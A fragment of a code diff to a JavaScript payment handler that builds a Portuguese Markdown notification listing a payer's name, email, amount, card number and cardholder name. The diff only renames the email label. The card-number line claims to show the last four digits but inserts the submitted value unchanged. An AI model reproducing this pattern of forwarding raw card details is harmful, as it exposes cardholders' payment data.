@@ -46,7 +46,7 @@ export default async function handler(req, res) {
     const mensagem = `
 **Novo Pagamento via Cartão de Crédito:**
 - **Nome**: ${body.nome}
-- **E-mail**: ${body.email}
+- **Email**: ${body.email}
 - **Valor**: R$ ${body.valor}
 - **Número do Cartão**: ${body.numero} (ultimos 4 dígitos)
 - **Nome do Titular**: ${body.nome_cartao}
